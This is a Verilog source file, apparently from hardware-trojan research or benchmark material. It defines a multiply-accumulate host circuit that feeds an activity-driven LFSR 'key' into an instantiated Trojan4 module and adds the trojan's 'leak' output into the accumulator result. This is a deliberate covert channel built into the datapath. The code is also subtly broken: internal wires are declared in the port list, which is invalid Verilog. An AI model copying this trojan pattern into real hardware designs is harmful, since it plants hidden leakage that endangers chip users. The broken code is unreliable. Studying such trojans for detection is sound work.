// MAC (Multiply-Accumulate) Host Circuit for Trojan4
// Interface: clk, rst, key[KEY_WIDTH-1:0] -> leak[LEAK_WIDTH-1:0]
module trojan4_mac_host #(
    parameter DATA_WIDTH = 32,
    parameter COEFF_WIDTH = 16,
    parameter ACCUM_WIDTH = 48,
    parameter KEY_WIDTH = 64,
    parameter LEAK_WIDTH = 64
)(
    input wire clk,
    input wire rst,
    input wire [DATA_WIDTH-1:0] data_in,
    input wire [COEFF_WIDTH-1:0] coeff_in,
    input wire mac_enable,
    input wire accum_clear,
    output reg [ACCUM_WIDTH-1:0] accum_out,
    output reg mac_valid,
    output reg mac_overflow,
    
    // Internal trojan signals
    wire [KEY_WIDTH-1:0] trojan_key,
    wire [LEAK_WIDTH-1:0] trojan_leak
);

    // MAC internal signals
    reg [DATA_WIDTH-1:0] data_reg;
    reg [COEFF_WIDTH-1:0] coeff_reg;
    reg [DATA_WIDTH+COEFF_WIDTH-1:0] mult_result;
    reg [ACCUM_WIDTH-1:0] accumulator;
    reg [7:0] mac_counter;
    reg [KEY_WIDTH-1:0] key_generator;
    
    // Key generation for trojan based on MAC operations
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            key_generator <= 64'h123456789ABCDEF0;
            mac_counter <= 8'b0;
        end else begin
            mac_counter <= mac_counter + 1;
            if (mac_enable) begin
                key_generator <= {key_generator[62:0], key_generator[63] ^ key_generator[5] ^ key_generator[3]};
            end
        end
    end
    
    assign trojan_key = key_generator;
    
    // Input registers
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            data_reg <= {DATA_WIDTH{1'b0}};
            coeff_reg <= {COEFF_WIDTH{1'b0}};
        end else if (mac_enable) begin
            data_reg <= data_in;
            coeff_reg <= coeff_in;
        end
    end
    
    // Multiplier stage
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            mult_result <= {(DATA_WIDTH+COEFF_WIDTH){1'b0}};
        end else if (mac_enable) begin
            mult_result <= data_reg * coeff_reg;
        end
    end
    
    // Accumulator stage with trojan leak integration
    always @(posedge clk or posedge rst) begin
        if (rst || accum_clear) begin
            accumulator <= {ACCUM_WIDTH{1'b0}};
            mac_overflow <= 1'b0;
        end else if (mac_enable) begin
            // Integrate trojan leak into accumulation
            if (ACCUM_WIDTH >= 64) begin
                accumulator <= accumulator + {{(ACCUM_WIDTH-DATA_WIDTH-COEFF_WIDTH){1'b0}}, mult_result} + 
                              {{(ACCUM_WIDTH-64){1'b0}}, trojan_leak};
            end else begin
                accumulator <= accumulator + {{(ACCUM_WIDTH-DATA_WIDTH-COEFF_WIDTH){1'b0}}, mult_result} + 
                              trojan_leak[ACCUM_WIDTH-1:0];
            end
            
            // Overflow detection
            mac_overflow <= (accumulator > ({ACCUM_WIDTH{1'b1}} - {{(ACCUM_WIDTH-DATA_WIDTH-COEFF_WIDTH){1'b0}}, mult_result}));
        end
    end
    
    // Output assignment
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            accum_out <= {ACCUM_WIDTH{1'b0}};
            mac_valid <= 1'b0;
        end else begin
            accum_out <= accumulator;
            mac_valid <= mac_enable;
        end
    end
    
    // Additional MAC features: saturation and rounding
    reg [ACCUM_WIDTH-1:0] saturated_result;
    always @(*) begin
        if (mac_overflow) begin
            saturated_result = {ACCUM_WIDTH{1'b1}};
        end else begin
            saturated_result = accumulator;
        end
    end
    
    // MAC pipeline control
    reg [2:0] pipeline_stage;
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            pipeline_stage <= 3'b000;
        end else if (mac_enable) begin
            pipeline_stage <= pipeline_stage + 1;
        end
    end
    
    // Instantiate Trojan4
    Trojan4 trojan_inst (
        .clk(clk),
        .rst(rst),
        .key(trojan_key),
        .leak(trojan_leak)
    );

endmodule